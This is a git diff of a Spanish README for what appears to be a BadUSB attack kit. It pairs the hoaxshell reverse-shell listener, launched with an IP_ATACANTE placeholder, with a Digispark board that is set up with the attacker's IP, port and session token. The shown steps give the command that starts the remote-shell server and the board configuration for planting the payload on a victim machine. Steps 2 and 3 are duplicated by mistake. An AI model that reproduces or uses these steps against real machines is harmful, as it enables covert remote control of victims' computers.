@@ -31,14 +31,18 @@ git clone https://github.com/t3l3machus/hoaxshell
 
 ## 🚀 Uso
 
-### 1) Ejecutar Hoaxshell.py, copiar el token generado en $i y dejar ejecutandose
+### 1. Ejecutar Hoaxshell.py, copiar el token generado en $i y dejar ejecutandose
 ```python
 python3 ./hoaxshell.py -s IP_ATACANTE -r -H 'Authorization'
 ```
 ![image](https://github.com/user-attachments/assets/8da49bb0-b57a-4613-9a5a-1bc4f6299157)
 
 
-### 2) Abrir Arduino con el script .ino del repositorio, modificar las variables que se mencionan en el script y seleccionar Digispark 16.5 Board:
+### 2. Abrir Arduino y seleccionar Digispark 16.5 Board.
+<img width="858" height="131" alt="imagen" src="https://github.com/user-attachments/assets/3de241e0-7181-44e2-aa3a-a96a26e3e4c1" />
+
+### 3. Abrir Arduino y seleccionar Digispark 16.5 Board.
+
 
 - IP_AND_PORT_ATTACKER: Pegar tu IP y puerto de maquina atacante
 - TOKEN: Pegar el token generado por hoaxshell
